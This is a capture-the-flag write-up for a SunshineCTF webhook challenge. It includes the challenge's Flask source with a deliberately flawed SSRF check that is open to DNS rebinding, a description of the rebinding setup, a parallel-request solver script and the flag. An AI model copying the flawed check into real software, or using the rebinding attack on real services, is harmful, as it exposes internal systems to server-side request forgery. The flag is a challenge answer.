# Intergalactic Webhook Service

```
I got tired of creating webhooks from online sites, so I made my own webhook service! It even works in outer space! Be sure to check it out and let me know what you think. I'm sure it is the most secure webhook service in the universe.
https://supernova.sunshinectf.games/ 
```

Attachment:

```python
import threading
from flask import Flask, request, abort, render_template, jsonify
import requests
from urllib.parse import urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import ipaddress
import uuid

def load_flag():
    with open('flag.txt', 'r') as f:
        return f.read().strip()

FLAG = load_flag()

class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        else:
            self.send_response(404)
            self.end_headers()

threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()

app = Flask(__name__)

registered_webhooks = {}

def create_app():
    return app

@app.route('/')
def index():
    return render_template('index.html')

def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None

@app.route('/register', methods=['POST'])
def register_webhook():
    url = request.form.get('url')
    if not url:
        abort(400, 'Missing url parameter')
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return reason, 400
    webhook_id = str(uuid.uuid4())
    registered_webhooks[webhook_id] = url
    return jsonify({'status': 'registered', 'url': url, 'id': webhook_id}), 200

@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    webhook_id = request.form.get('id')
    if not webhook_id:
        abort(400, 'Missing webhook id')
    url = registered_webhooks.get(webhook_id)
    if not url:
        return jsonify({'error': 'Webhook not found'}), 404
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return jsonify({'error': reason}), 400
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)
        return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code
    except Exception:
        return jsonify({'url': url, 'error': 'something went wrong'}), 500

if __name__ == '__main__':
    print('listening on port 5000')
    app.run(host='0.0.0.0', port=5000)
```

It is prone to DNS rebinding attack, similar to [K17 CTF 2025 Janus](../2025-09-19-k17-ctf-2025/janus.md). We setup the same server and point `NS` to it. Then, we register a webhook for url `http://[REDACTED]:5001/flag` where `REDACTED` is the domain that our custom DNS server handles. At last, we trigger the webhook in parallel to get flag:

```python
import requests
import random
import multiprocessing
import time
from multiprocessing import Process, Queue


def worker_function(url, data):
    try:
        r = requests.post(
            url,
            data=data,
        )
        q.put(r.text)
    except:
        q.put("")
        pass


if __name__ == "__main__":
    while True:
        url = f"https://supernova.sunshinectf.games/trigger"

        parallel = 16
        procs = []
        q = Queue()
        for i in range(parallel):
            proc = multiprocessing.Process(
                target=worker_function,
                args=(url, {"id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"}), # the webhook id corresponding to http://[REDACTED]:5001/flag
            )
            proc.start()
            procs.append(proc)

        res = []
        for i in range(parallel):
            res.append(q.get())

        print(res)

        for i in range(parallel):
            procs[i].join()
```

Flag: `sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`.
